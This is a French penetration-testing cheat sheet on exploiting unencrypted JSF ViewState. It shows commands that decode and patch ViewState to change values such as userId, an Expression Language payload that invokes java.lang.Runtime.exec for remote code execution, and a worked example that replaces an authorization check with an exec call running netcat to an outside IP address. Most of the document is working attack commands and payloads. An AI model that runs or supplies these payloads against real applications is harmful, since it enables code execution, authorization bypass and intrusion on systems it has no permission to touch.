# JSF Viewstate

For trainings : https://www.slideshare.net/frohoff1/appseccali-2015-marshalling-pickles

Si la viewstate n'est pas chiffrée, et est interprêtée côté client. Il est possible de la décoder pour récupérer des informations. En plus de cela, il est possible de la patcher afin de modifier les valeurs des variables ou bien même réaliser de l'exécution de code.

## Decode

```
$ ./inyourface.sh viewstate.txt > decoded.txt
```

## Patching de la viewstate

```
$ ./inyourface.sh -patch 0x7e0040 userId 0 -outfile /tmp/patched.txt /tmp/viewstate.txt
```

Pour faire de la RCE chercher les : **org.apache.el.ValueExpressionImpl**

Exemple de payload à injecter: 

```
#{request.getClass().getClassLoader().loadClass(‘java.lang.
Runtime’).getDeclaredMethods()[6].invoke(null).exec(‘<cmd>’)
```

```
./inyourface.sh -rawpatch 441 465 /tmp/payload.txt -outfile /tmp/patched.txt /tmp/viewstate.txt
```

## Méthodologie pour rawpatch

```
$ echo -ne '\x4d\x00\x42\x23\x7b\x21\x73\x65\x73\x73\x69\x6f\x6e\x55\x74\x69\x6c\x69\x73\x61\x74\x65\x75\x72\x42\x65\x61\x6e\x2e\x69\x73\x50\x52\x4f\x20\x61\x6e\x64\x20\x21\x73\x65\x73\x73\x69\x6f\x6e\x55\x74\x69\x6c\x69\x73\x61\x74\x65\x75\x72\x42\x65\x61\x6e\x2e\x69\x73\x50\x41\x52\x7d\x00\x07\x62\x6f\x6f\x6c\x65\x61\x6e' > /tmp/blockdata.bin
```

```
./patch_blockdata.py "#{\!sessionUtilisateurBean.isPRO and \!sessionUtilisateurBean.isPAR}" "#{request.getClass().getClassLoader().loadClass('java.lang.Runtime').getDeclaredMethods()[6].invoke(null).exec('nc 10.10.10.10 8000')}" blockdata.bin blockdata-patched.bin
```

```
$ ./inyourface.sh -rawpatch 4109 4187 /tmp/blockdata-patched.bin -outfile /tmp/viewstate-patched.txt /tmp/viewstate.txt
```

## Liens

https://www.synacktiv.com/ressources/MISC69_pentest_JSF.pdf

Un grand merci à Renaud Dubourguais et Nicolas Collignon pour leur outils et aide de déboggage.